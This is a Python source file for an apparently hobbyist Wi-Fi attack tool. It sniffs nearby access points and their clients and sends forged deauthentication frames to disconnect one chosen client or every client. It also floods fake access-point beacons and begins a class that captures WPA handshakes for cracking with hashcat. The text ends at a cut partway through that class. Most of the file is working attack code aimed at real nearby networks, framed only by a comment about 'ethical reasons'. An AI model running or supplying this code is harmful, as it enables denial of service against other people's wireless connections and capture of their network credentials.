# WIFI SCANNER  // DEAUTH MODULE // THIS WILL HOLD MALICIOUS LOGIC MEANT FOR ETHICAL REASONS


# UI IMPORTS
import pyfiglet
import pyfiglet.fonts
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.console import Console
console = Console()

# NETWORK IMPORTS
import pywifi, socket, ipaddress
from scapy.all import sniff, RadioTap, IP, ICMP, sr1, sendp, RandMAC
from scapy.layers.eap import EAPOL
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth



# NSM IMPORTS
from nsm_utilities import Utilities
from nsm_files import Settings


# ETC IMPORTS 
import threading, os, random, time, pyttsx3, string

# FILE IMPORTS
from pathlib import Path
import json

  # PATH
BASE_DIR = Path.home() / "Documents" / "nsm_tools" / ".data" 
BASE_DIR.mkdir(exist_ok=True, parents=True)

    
# THINGS TO STUDY FOR MATH ASVAB 
MATH = ["percentage", "algebra", "PEMDAS", "Area & Distance", "regular to fraction", "factor equations", "angle of triangle", "area and volume"]


for m in MATH:
    console.print(m)
print("\n\n")


# USE THIS TO INSTALL LIBARIES IN VENV
# source .venv/bin/activate


# RUN THIS FOR NOW TO BEGIN DEAUTH MODULE
# sudo ./.venv/bin/python nsm_deauth.py



class Frame_Snatcher():
    """This class will be responsible for sniffing out frames and or pulling mac address"""


    macs = []   
    beacons = []
    num = 1 


    def __init__(self):
        pass
    

    
    @classmethod
    def get_interface(cls):
        """This method will be used to get the user interface and automatically create a file saving it for default use"""

        
        try:
            # SET DEFAULT IFACE IF AVAILABLE
            data = Settings.get_json()
            def_iface = data['iface']


            # GIVE OPTION FOR DEFAULT
            if def_iface != "":
                use = f"or press enter for {def_iface}"
            
            else:
                use = ""

            
            while True:
                iface = console.input(f"[bold blue]Enter iface {use}: ").strip()
                

                # NEED SOME TYPE OF IFACE
                if iface == "" and def_iface == "":

                    console.print("You must enter iface to procced silly", style="bold red")

                
                # ROLL BACK TO DEFAUT
                elif iface == "":
                    iface = def_iface

                    return iface
                

                
                # SET NEW DEF IFACE
                else:
                    data['iface'] = iface
                    
                    # NOW TO UPDATE SETTINGS
                    Settings.push_json(data=data)

                    return iface
            

        # ERROR 
        except Exception as e:
            console.print(f"[bold red]Exception Error:[yello] {e}")
                    

    @classmethod
    def welcome_ui(cls, iface , text="    WiFi \nHacking", font="dos_rebel", c1="bold red", c2="bold purple", skip=False):
        """This method will house the welcome message"""


        # SET THE MODE
        mode = 1



        if mode == 1:


            # CREATE THE VAR
            welcome = pyfiglet.figlet_format(text=text, font=font)
            
            print('\n\n')
            console.print(welcome, style=c2)
            console.print(f"\n[bold red]Current iface:[bold green] {iface}\n\n")
            if skip == False:
                console.input("[bold red]Press ENTER to Sniff! ")
            print('\n')


        

        elif mode == 2:

            fonts = pyfiglet.FigletFont.getFonts()


            for f in fonts:

                welcome = pyfiglet.figlet_format(text=text, font=f)

                console.print(welcome, style=c2)

                console.print(f"[bold blue]Current Font:[bold green] {f}\n\n")
                

                if f == "dos_rebel":
                    t = 3
                
                else:

                    t = 0.3



                time.sleep(t)


    @classmethod
    def sniff_for_targets(cls, iface="wlan0", verbose=1, timeout=15):
        """This method will be used to sniff out mac addresses using the sniff function"""

        # COUNT THE ATTEMPTS
        tempt = 1   


        # LOOP THAT BITCH
        try:
            while True:

                
                # OUTPUT ATTEMPT
                console.print(f"Sniff Attempt #{tempt}", style="bold green")

                    
                # SNIFF THAT BITCH
                sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)
                
                # APPEND TEMPT
                tempt += 1

                
                # KEEP LOOPING UNTIL TRUE
                if cls.beacons:
                    

                    # SNIFF AGAIN
                    sniff(iface=iface, prn=Frame_Snatcher.packet_parser, count=0, store=0, timeout=15)

                    break
        

        except Exception as e:
            console.print(f"[bold red]\n\nException Error:[yellow] {e}")

            console.input("[bold green]\nPress enter to return the the Main Menu: ")


            # RETURN TO MAIN MODULE
            from nsm_ui import MainUI
            MainUI.main()
            

    @classmethod
    def packet_parser(cls, pkt):
        """This method will be called upon to then parse the given packet"""



        # COLORS
        c1 = "bold yellow"
        c2 = "bold red"
        c3 = "bold blue"
        c4 = "bold green"

        
      
        # THIS IS STRICTLY USED TO CAPTURE BEACON FRAMES // SENT FROM AP'S
        if pkt.haslayer(Dot11Beacon):

            
            # SET VARS
            addr1 = str(pkt[Dot11].addr1) if pkt[Dot11].addr1 != "ff:ff:ff:ff:ff:ff" else "No"
            addr2 = str(pkt[Dot11].addr2) if pkt[Dot11].addr2 != "ff:ff:ff:ff:ff:ff" else "No"


            # GET SSID
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"

            # GET VENDOR
            vendor = Utilities.get_vendor(mac=addr2)

            if vendor:
                text = f"Vendor: {vendor}"
            
            else:
                text = ""



            
            # THIS IS HERE JUST TO BE HERE FRL
            if addr1 not in cls.macs and addr1 != "No":
                

                # ADD MAC
                cls.beacons.append((ssid, addr1, vendor))
                cls.macs.append(addr1)
                cls.num += 1


                # NOW TO OUTPUT RESULTS
                console.print(f"[{c2}][+] Found a new mac addr1:[{c4}] {addr1}")



            # BEACON == AP FRAMES ONLY           
            if addr2 not in cls.macs and addr2 != "No":


                # ADD MAC
                cls.beacons.append((ssid, addr2, vendor))
                cls.macs.append(addr2)
                cls.num += 1



                # NOW TO OUTPUT RESULTS
                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}") #  -  [{c1}]{ssid}")

   
    @classmethod
    def track_clients(cls, target, iface, track=True, delay=5):
        """This method will be responsible for tracking the online clients"""


        # DESTROY ERRORS
        verbose = True
        cls.SNIFF = True

        
        # CREATE A CLIENT LIST

        def sniff_for_clients(timeout=0):
            """This will be used to sniff for clients"""


            console.print("\n -----  SNIFF STARTED  ----- ", style="bold green")
            

            # BEGIN THE SNIFF
            while cls.SNIFF:
                sniff(iface=iface, prn=parse_for_clients, count=0, store=0, timeout=2) #timeout=timeout)
        
            console.print("\n -----  SNIFF ENDED  ----- ", style="bold red")



        def parse_for_clients(pkt):
            """This will be used to parse for clients"""



            # CHECK IF YOUR ALLOWED TO BE ALIVE
            if cls.SNIFF:
            

                # FILTER FOR WIFI FRAMES
                if pkt.haslayer(Dot11):


                    # ADDR VARS
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
    
                    
                    # VALID CLIENTS ONLY
                    if addr1 == target or addr2 == target:

                        
                        
                        # ADDR1
                        if addr1 != target and addr1 not in cls.clients and addr1:


                            # ADD TO LIST
                            cls.clients.append(addr1)

                            if verbose:
                                console.print(f"Client: {addr1} --> {target}")

                    
    
                        # ADDR2
                        elif addr2 != target and addr2 not in cls.clients and addr2:


                            # ADD TO LIST
                            cls.clients.append(addr2)

                            if verbose:
                                console.print(f"Client: {addr2} --> {target}")



        # START TRACKING CLIENTS
        threading.Thread(target=sniff_for_clients, daemon=True).start()

        

        #console.print("----- STARTED -----", style="bold green")
        time.sleep(10)

        # LOOP THIS BITCH
        while cls.SNIFF:
            
            # RESET CLIENT LIST
            cls.clients = []
            console.print("wiped", style="bold red")
            time.sleep(delay)


    @classmethod
    def target_chooser(cls, type):
        """In this method the user will choose which target they want to attack"""

       
        # CREATE VARS
        data = {}
        num = 0
        error = False
        verbose = False


        # CREATE A TABLE AND OUTPUT IT
        table = Table(title="Targets", style="bold purple", border_style="bold red", title_style="bold purple", header_style="bold purple")
        table.add_column("Key", style="bold red")
        table.add_column("SSID", style="bold blue")
        table.add_column("MAC Addr", style="bold green")
        table.add_column("Vendor", style="yellow")
        


        # LOOP THROUGH RESULTS
        for var in cls.beacons:


            # APPEND NUMBER
            num +=1 

            # ADD TO DICT
            data[num] = var[1]


            # ADD TO TABLE
            table.add_row(f"{num}", f"{var[0]}",  f"{var[1]}", f"{var[2]}")
            
        

        # CREATE VAR
        keys = num


        
        print('\n\n')
        console.print(table)
        print('\n')



        @staticmethod
        def rescan_option():
            """This function will be used to ask to user weather or not they want to do another scan or continue with the results"""
        
 
            
            # USER INPUT
            choice = console.input("[bold red]Do you want to rescan?[bold green] (y/n): ").strip().lower()


            if choice in ["1", "yes", "y", "go", "yea"]:

                
                
                # RETURN TO MODULE MAIN METHOD
                Utilities.clear_screen()
                Frame_Snatcher.main(skip=True, type=type)


            elif choice in [0, "no", "n", "nope", "nah"]:

                return False

            
            else:

                return False
        
        

        # ASK THE USER IF THEY WANT TO RESCAN
        rescan_option()


        
        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    target = data[choice]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return target
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break
    

    @classmethod
    def client_chooser(cls, target, iface, verbose=0, timeout=120):
        """This method will be responsible for grabbing the single client on the target <-- TYPE 1"""

        
        # VARS
        clients = []
        clients_info = []
        verbose = True


        # CREATE TABLE
        table = Table(title="Client List", title_style="bold red", style="bold purple", border_style="purple", header_style="bold red")
        table.add_column("#")
        table.add_column("MAC Addr", style="bold blue")
        table.add_column("-->", style="bold red")
        table.add_column("AP", style="bold green")
        table.add_column("Vendor", style="bold yellow")


        
        # SNIFF FOR CLIENTS FIRST
        def small_deauth():
            """Send a deauth packet and sniff the reconnected macs"""

            sent = 0


            # DELAY WAIT FOR SNIFF
            time.sleep(3)


            # FUNCTION
            while sent < 10:

                # RANDOMIZE THE DEAUTH
                reasons = random.choice([4,5,7,15])
                
                # CRAFT THE FRAME
                frame = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

                # SEND THE FRAME
                sendp(frame, iface=iface, verbose=False)


                # WAIT
                time.sleep(1)


                # GO
                sent += 1

                if verbose:
                    console.print(f"Deauth --> {target}  -  Reason: {reasons}", style="bold red")


        def client_sniffer(pkt):
            """This will sniff client macs connected to the target"""

            
            # CATCH
            try:

                # FILTER FOR DOT11 FRAMES
                if pkt.haslayer(Dot11):

                    
                    # COLLECT ADDR1 & ADDR2
                    addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                    addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False

                    

                    # CHECK FOR TARGET
                    if addr1 == target or addr2 == target:

                        

                        # ADDR1
                        if addr1 != target and addr1 not in clients and addr1:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr1)
                            
                            # APPEND TO LIST
                            clients.append(addr1)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr1}", " --> ", f"{target}", f"{vendor}")

                        
                        
                        # ADDR2
                        elif addr2 != target and addr2 not in clients and addr2:


                            # GET VENDOR
                            vendor = Utilities.get_vendor(mac=addr2)

                            
                            # APPEND TO LIST
                            clients.append(addr2)

                            # FOR INFO
                            clients_info.append((addr2, vendor))


                            # ADD DATA TO TABLE
                            table.add_row(f"{len(clients)}", f"{addr2}", " --> ", f"{target}", f"{vendor}")



            # BREAK
            except KeyboardInterrupt as e:
                console.print(f"[bold red]YOU ESCAPED THE MATRIX:[yellow] {e}")                
            
            
            # ERROR
            except Exception as e:
                console.print(f"[bold red]Exception Error:[yellow] {e}")


    

        # START A BACKGROUND THREAD
        threading.Thread(target=small_deauth, daemon=True).start()


        # SNIFF RESULTS
        #sniffed = 0
        #while sniffed < 60:
        console.print(f"\nI will now begin to sniff for clients for the next {timeout} seconds if you want to stop earlier press [bold green]ctrl + c!\n", style="bold red")
        time.sleep(2)

        # SNIFF
        with Live(table, console=console, refresh_per_second=2):
            sniff(iface=cls.iface, prn=client_sniffer, store=0, count=0, timeout=timeout)
        

        
        data = {}
        num = 0
        error = False
        for client in clients:

            # NUM
            num += 1

            # ADD DATA
            data[num] = client
        
        console.print(data)

        # DESTROY ERRORS
        while True:
            try:
                
                
                # FOR CLEANER OUTPUT
                if error:
                    console.print(f"\n[bold red]Enter a key[bold red] 1 - {num},[bold green] to choose your target!")
                    error = False 


                # USER CHOOSES THERE TARGET
                choice = console.input(f"[bold red]Who do you want to attack?: ").strip()

                # INT IT 
                choice = int(choice)



                if choice in range(1, num) or choice == num:
                    target = data[choice]


                    console.print(f"\n[bold red]Target choosen:[yellow] {target}")

                    
                    # RETURN THE TARGET
                    return target
                
                

                # OUTSIDE OF NUM
                else:
                    error = True
                    
            
            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except KeyError as e:
                
                if verbose:
                    console.print(e)


                error = True

            

            # DIDNT ENTER A KEY VALUE (INTEGER)
            except TypeError as e:

                if verbose:
                    console.print(e)


                error = True
            

        
            
            # ELSE
            except Exception as e:

                if verbose:

                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                
                if error == False:
                    error = 1
                
                elif error:
                    error += 1
                

                # SAFETY CATCH
                if error == 4:

                    console.print("Alright ur done for", style="bold red")
                    break


    @classmethod
    def target_attacker(cls, target, client="ff:ff:ff:ff:ff:ff", verbose=1, iface="wlan0", inter=0.1, count=25):
        """This method will be responsible for attacking the choosen target"""


        # VARS
        packets_sent = 0
        error = 0


        # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
        threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()

        
        # BEGINNING OF THE END
        use = 2
        if use == 1:
            console.print(f"\n[bold red]Now Launching Attack on:[bold green] {target}\n\n")
        elif use == 2:
            console.print(f"\n[bold red]Attacking  ----->  [bold green]{target}[/bold green]  <-----  Attacking\n\n")

        time.sleep(2)



        # CREATE LIVE PANEL
        down = 5
        panel = Panel(renderable=f"Launching Attack in {down}", style="bold yellow", border_style="bold red", expand=False, title="Attack Status")




        # LOOP UNTIL CTRL + C
        with Live(panel, console=console, refresh_per_second=4):


            # UPDATE RENDERABLE THIS IS THE COUNTDOWN UNTIL START
            while down > 0:
                
                # OUTPUT N UPDATE
                panel.renderable = f"Launching Attack in: {down}"
                down -= 1
                
                # NOW FOR THE ACTUAL DELAY LOL
                time.sleep(1)
            

            # USE THIS VARIABLE TO BREAK NESTED LOOP
            STAY = True
            
            # NOW FOR THE ATTACK
            while STAY:
                try:


                    
                    # GET REASON FOR BEING KICKED OFF / CHOOSE DIFFERENT ONES IN CASE SOME WORK BETTER THEN OTHERS
                    reasons = random.choice([4,5,7,15])

                    # CREATE THE LAYER 2 FRAME
                    frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)


                    # NOW TO SEND THE FRAME
                    sendp(frame, iface=iface, inter=inter, count=count, verbose=verbose)


                    # UPDATE VAR & PANEL
                    packets_sent += count

                    # COLORS
                    c1 = "bold red"

                    panel.renderable = (
                        f"[{c1}]Target:[/{c1}] {target}  -  " 
                        f"[{c1}]Client:[/{c1}] {client}  -  " 
                        f"[{c1}]Total Frames Sent:[/{c1}] {packets_sent}  -  "  
                        f"[{c1}]Reason:[/{c1}] {reasons}  -  "  
                        f"[{c1}]Clients:[/{c1}] {len(cls.clients)}"

                        )
                    
            


                except KeyboardInterrupt as e:
                    console.print(e)

                    
                    # WAIT
                    while STAY:
                        try:
                            console.print(f"Cleaning up", style="bold red")
                            time.sleep(3)

                            STAY = False       # BREAK NESTED LOOP
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
                        

                        except KeyboardInterrupt as e:
                            console.print("STOP PRESSING ctrl + c", style="bold red")
                        

                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")


                    if error < 4:
                        error += 1
                    
                    else:
                        
                        console.print("[bold red]Max Amount of Errors Given!")


                        STAY = False       # BREAK NESTED LOOP
                        cls.SNIFF = False  # KILL BACKGROUND THREAD
                    
    
    @classmethod
    def main(cls, type, skip=False):
        """This is where the module will spawn from"""


        # CLEAR SCREEN
        Utilities.clear_screen()


        # CLEAN VARS
        cls.macs = []
        cls.beacons = []
        cls.num = 1
        cls.clients = []

        
        # CATCH YOU 
        try:

            # GET GLOBAL IFACE
            cls.iface = Frame_Snatcher.get_interface()
            

            # PRINT WELCOME UI
            Frame_Snatcher.welcome_ui(skip=skip, iface=cls.iface)

            
            # SNIFF FOR TARGETS
            Frame_Snatcher.sniff_for_targets(iface=cls.iface)


            # ALLOW THE USER TO CHOOSE THERE TARGET
            target = Frame_Snatcher.target_chooser(type=type)


            # NOW TO TRACK THE AMOUNT OF CLIENTS ON THE AP
            # threading.Thread(target=Frame_Snatcher.track_clients, args=(target, cls.iface), daemon=True).start()


            # ALL CLIENT ATTACK
            if type == 2:

                # ATTACK ALL CLIENTS ON TARGET
                Frame_Snatcher.target_attacker(target=target, iface=cls.iface)   
            

            # SINGLE CLIENT 
            elif type == 1:

                # SNAG CLIENT
                client = Frame_Snatcher.client_chooser(target=target, iface=cls.iface)
                
                # NOW ATTACK CLIENT ON TARGET
                Frame_Snatcher.target_attacker(target=target, client=client, iface=cls.iface)


        

        except KeyboardInterrupt as e:
            console.print(e)

        
        # DESTROY YOU
        except Exception as e:
            console.print(f'[bold red]Exception Error:[yellow] {e}')   




            # END
            console.print("\n\nThank you for trying out my program", style="bold red") 

            time.sleep(1.5)



class Beacon_Flooder():
    """This class will be responsible for creating and flooding fake APs to nearby devices"""
    

    # CLASS VARS
    custom_ssids = [
            "FBI_Surveillance_Van",
            "PrettyFlyForAWiFi",
            "ItHurtsWhenIP",
            "DropTablesWiFi;",
            "Virus_AP_DoNotConnect",
            "NSA_CoffeeShop",
            "404_WiFi_Not_Found",
            "Free_Vbucks_5GHz",
            "TellMyWiFiLoveHer",
            "Barii_Hacking_You",
            "LAN_of_the_Free",
            "WuTangLAN",
            "C:\Virus.exe",
            "Give_Us_Your_Data",
            "Pay4WiFi_Loser",
            "Open_AP_Honeypot",
            "DefinitelyNotAScam",
            "Connect_And_Cry",
            "Skynet_Online",
            "Free_Crypto_Mining"
        ]

    
    def __init__(self):
        pass
    

    @classmethod
    def sniff_local_ssids(cls, iface):
        """This method will be used to sniff the local ssids in the area"""


        # VARS
        ssids = []
        verbose = True


        def sniffer():
            """This will begin sniffing"""
            

            # VAR
            attempt = 0
            

            # LOOP FOR BLANKS
            while True:
                try:

                    # ATTEMPT
                    attempt += 1
                    console.print(f"[bold red]Sniff Attempt[/bold red] #{attempt}")


                    sniff(iface=iface, prn=parser, timeout=15, count=0, store=0)

                    if ssids:

                        
                        # SNIFF AGAIN
                        sniff(iface=iface, prn=parser, timeout=15)


                        # LEAVE
                        break
                    

                    time.sleep(1)
                

                except Exception as e:
                    console.print(f"[bold red]\n\nException Error:[yellow] {e}")

                    console.input("[bold green]\nPress enter to return the the Main Menu: ")


                    # RETURN TO MAIN MODULE
                    from nsm_ui import MainUI
                    MainUI.main()

        

        def parser(pkt):
            """This will parse pkt"""

            
            # MUST MEET PROTOCOL
            if pkt.haslayer(Dot11Beacon):


                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False


                use = False


                # RETRIEVE SSID
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"

                
                
                # DESTINATION ADDR
                if use:
                    if addr1 and ssid not in ssids and use: 

                        

                        # APPEND
                        ssids.append(ssid)


                        if verbose:
                            console.print(f"[+] Found SSID:[bold yellow] {ssid}", style="bold red")
                    
                
                    
                # SOURCE ADDR  <-- BEACON
                elif addr2 and ssid not in ssids:


                    # APPEND
                    ssids.append(ssid)


                    if verbose:
                        console.print(f"[+] Found SSID:[bold yellow] {ssid}", style="bold red")

        

        # SNIFF FOR SSIDS
        sniffer()


        # NOW TO RETURN IT 
        return ssids
 


    @classmethod
    def get_ssid(cls, type, length=8):
        """This method will create a ssid"""


        # 1 == RANDOM
        if type == 1:
            return str(random.choices(cls.ssids)[0])
        
        
        # SET LIST
        elif type == 2:
           

           # SET
           vr = cls.custom_ssids[0]
           cls.custom_ssids.remove(vr)
           return vr

           t = random.choices(cls.custom_ssids)[0]
           
           s = string.ascii_letters = t

           
           #return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        

        elif type == 3:
            return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

         

        pass



    @classmethod
    def get_bssid(cls, type):
        """This method will create a bssid"""

        
        # 1 == RANDOM
        if type == 1:
            mac = str(RandMAC())

            return mac
        

        elif type == 2:
            return "02:%02x:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(6))


        pass


    
    @classmethod
    def get_frames(cls, amount, ssid_type, bssid_type, client="ff:ff:ff:ff:ff:ff"):
        """This method will create the frame"""


        # VAR
        frames = []
        verbose = True
        print("\n\n")

        b =  Beacon_Flooder() 
        
        while amount >= 0:


            # GET SSID
            ssid =  b.get_ssid(type=ssid_type)

            # GET BSSID
            bssid = Beacon_Flooder.get_bssid(type=bssid_type)


            # CRAFT FRAME
            frame = RadioTap() /\
                Dot11(type=0, subtype=8, addr1=client, addr2=bssid, addr3=bssid) /\
                Dot11Beacon(cap="ESS") /\
                Dot11Elt(ID="SSID", info=ssid.encode(), len=len(ssid))


            # APPEND AND GO
            frames.append(frame)

            amount -= 1


            if verbose:
                console.print(f"[bold red]Frame Creation --> [bold yellow]{frame}")

        
        # NOW RETURN THE LIST OF FRAMES
        return frames
    
   

    @classmethod
    def frame_injector(cls, frames, verbose=True, count=1):
        """This method will inject the frames into the network"""


        # VARS
        sent = 0
        down = 5

        # PANEL
        panel = Panel(renderable=f"Launching Attack in {down}" , title="Attack Status", style="bold yellow", border_style="bold red", expand=False)


        # LOOP
        with Live(panel, console=console, refresh_per_second=4):


            # COUNT DOWN
            while down != 0:
                

                # PANEL
                panel.renderable = f"Launching Attack in {down}"
                time.sleep(1)

                
                # DECREASE 
                down -= 1

            
            # LOOP FOR ERRORS
            while True:

                try:

                    frames = Beacon_Flooder.get_frames(ssid_type=3, bssid_type=2, amount=15)

                    
                    # INJECT PACKETS INTO 
                    sendp(frames, verbose=verbose, iface=cls.iface)



                    # NOTICE
                    sent += count

                   
                    # COLORS
                    c1 = "bold red"


                     # UPDATE PANEL
                    panel.renderable = (
                        f"[{c1}]Targets:[/{c1}] {len(frames)}  -  " 
                        f"[{c1}]Frames Sent:[/{c1}] {sent}  -  " 
                        )
                    


                    # DELAY
                    time.sleep(1.1)
                    


                
                # THIS LOGIC IS TO SUBSIDIZE SENDP
                except KeyboardInterrupt as e:
                    console.print(f"ATTEMPTING TO ESCAPE THE MATRIX", style="bold red")

                    try:
                        time.sleep(3)

                        break
                    

                    except KeyboardInterrupt as e:
                        console.print("STOP PRESSING CTRL + C", style="bold yellow")


                
                # GENERAL ERRORS
                except Exception as e:
                    console.print(e)
                    

                    # FOR CONSISTENT ERRORS
                    if down < 3:
                        down += 1
                    
                    elif down == 4:
                        console.print("[bold red]MAX ERRORS OCCURED: 4")
                        time.sleep(2)
                        break


    @classmethod
    def main(cls):
        """This is where class wide logic will be performed from"""

        
        # CATCH
        try:

            # GET IFACE
            cls.iface = Frame_Snatcher.get_interface()


            # OUTPUT UI
            Frame_Snatcher.welcome_ui(iface=cls.iface)


            # SNIFF AREA FOR NEARBY SSIDS
            cls.ssids = Beacon_Flooder.sniff_local_ssids(iface=cls.iface)

    
            # CRAFT FRAMES
            frames = Beacon_Flooder.get_frames(ssid_type=1, bssid_type=2, amount=15)

            
            # INJECT THE FRAMES
            Beacon_Flooder.frame_injector(frames=frames)


            console.print(frames)


        except KeyboardInterrupt as e:

            console.print(e) 
       

        except Exception as e:
            
            console.print(f"[bold red]Exception Error:[yellow] {e}")



class Hash_Snatcher():
    """This method will snatch handshakes out the air and potentially pass them to hashcat"""


    # USE THIS TO KILL BACKGROUND THREAD
    SNIFF = True

    
    def __init__(self):
        pass

    


    @classmethod
    def sniff_for_ap(cls, iface, timeout=15):
        """This will sniif for APs in the area"""



        def sniffer():
            """This will sniff"""


            # VARS
            count = 0


           # console.print("\n ---  SNIFF STARTED  --- \n", style="bold green")
            

            # CLOSE EMPTY LIST
            while True:

                try:

                    count += 1

                    console.print(f"Sniff Attempt #{count}", style="bold red")
                    
                    sniff(iface=iface, store=0, timeout=timeout, prn=parser)

                    if cls.ssids:

                        # SNIFF AGAIN
                        sniff(iface=iface, store=0, timeout=timeout, prn=parser)

                        break
                

                except Exception as e:
                    console.print(f"[bold red]\n\nException Error:[yellow] {e}")

                    console.input("[bold green]\nPress enter to return the the Main Menu: ")


                    # RETURN TO MAIN MODULE
                    from nsm_ui import MainUI
                    MainUI.main()
                    
           # console.print("\n ---  SNIFF ENDED  --- \n", style="bold red")


        def parser(pkt):
            """Parse packets"""


            
            # LAYERS
            if pkt.haslayer(Dot11Beacon):

                

                # SET ADDR
                addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False



                # SET SSID
                ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"



                if addr2 and ssid not in cls.ssids:

                    
                    console.print(f"[bold red][+] SSID Found:[bold yellow] {ssid}")
                    cls.ssids.append(ssid)
                    cls.mac_ifo.append((addr2, ssid))
    


        
        # START
        sniffer()

    
    
    @classmethod
    def target_attacker(cls, iface, verbose=True):
        """This will send deauth packets to AP clients"""



        def looper():
            """Loop targets"""

            
            # VARS
            frames = []



            
            # ITER
            for mac in cls.mac_ifo:
                
                
                # GET FRAMES // PLURAL FOR REASONS
                ssid_frames = frame_creation(target=mac[0])


                # APPEND
                frames.append(ssid_frames)


                if verbose:
                    console.print(f"Frame Creation -->[bold green] {mac[1]}", style="bold red")
                    time.sleep(0.05)
 
                
            
            # DONE
            console.print(frames)
            console.print("\nAll frames Succesfully made!", style="bold green")
            time.sleep(2)


            # RETTURN RESULTS
            return frames


        def frame_creation(target, client="ff:ff:ff:ff:ff:ff"):
            """This will create frames"""


            framess = []


            # REASON FOR KICKING
            #reasons = [4,5,7,15]
            

            # ITERATE
            reasons = random.choice([4,5,7,15])


            # CRAFT FRAME
            frame = RadioTap() / Dot11(addr1=client, addr2=target, addr3=target) / Dot11Deauth(reason=reasons)
                

            # APPEND
            framess.append(frame)

            

            return frame

        
        def attack(frames, sent=50, count=10, verbose=False, delay=1, realtime=0):
            """Attack clients on AP's"""
            

            # VARS

            
            # LOOP ERROS
            while sent != 0 and cls.SNIFF:
                    
                # SNATCH ERRORS
                try:
                
                    # INJECT FRAMES
                    sendp(frames, count=count, iface=iface, verbose=verbose, realtime=realtime)


                    
                    # ALERT
                    console.print(f"Deauth --> {len(cls.ssids)} Targets ", style="bold red")


                    # DOWN
                    sent -= 1
                    time.sleep(delay)



                # DESTROY
                except KeyboardInterrupt as e:
                    console.print(e)

                    cls.SNIFF = False  # KILL BACKGROUND THREAD
                

                except Exception as e:
                    console.print(f"[bold red]Exception Error:[bold yellow] {e}")
        
        
        
        # WAIT FOR THREAD
        time.sleep(2)
        console.print("BACKGROUND THREAD STARTED", style="bold green")

        # START
        cls.SNIFF = True
        frames = looper()


        # NOW ATTACK
        #attack(frames=frames, count=50, delay=10, sent=3, realtime=0)


        # NOW SLOW ATTACK
        #attack(frames=frames, count=10, delay=10)


        # DONE
        console.print("\n --- DEAUTH ENDED --- ", style="bold red")



    @classmethod
    def sniff_for_hashes(cls, iface, timeout=60):
        """This method will be responsibe sniffing handshakes"""


        
        
        def sniffer():
            """This will sniff"""

            

            # START SNIFF
            STAY = True
            console.print("\n ---  SNIFF STARTED  --- ", style="bold green")


            # SNIFF
            while STAY:

                try:
                    sniff(iface=iface, prn=parser, store=0, timeout=timeout)


                    # FOR WHEN SNIFF FAILED LET USER NOW ITS STILL RUNNING
                    console.print("Still Sniffing\n", style="bold green")
                    

                    # DELAY FOR CTR + C
                    time.sleep(1)
                
                

                # FOR USER LEAVING
                except KeyboardInterrupt as e:
                    console.print(f"{e}")

                    while STAY:
                        try:
                            console.print(f"Cleaning up", style="bold red")
                            time.sleep(3)

                            STAY = False       # BREAK NESTED LOOP
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
                        

                        except KeyboardInterrupt as e:
                            console.print("STOP PRESSING ctrl + c", style="bold red")
                            cls.SNIFF = False  # KILL BACKGROUND THREAD 

                

                # GENERAL ERRORS
                except Exception as e:
                    console.print(f"[bold red]Exception Error:[yellow] {e}")

                    time.sleep(3)
                    STAY = False
                    cls.SNIFF = False  # KILL BACKGROUND THREAD 

                    # CONFIRM UR STILL HERE
                    console.print("Still sniffing for hashes", style="bold green")

            

            # SNIFF END
            console.print("\n ---  SNIFF ENDED  --- ", style="bold red")

        

        def parser(pkt):
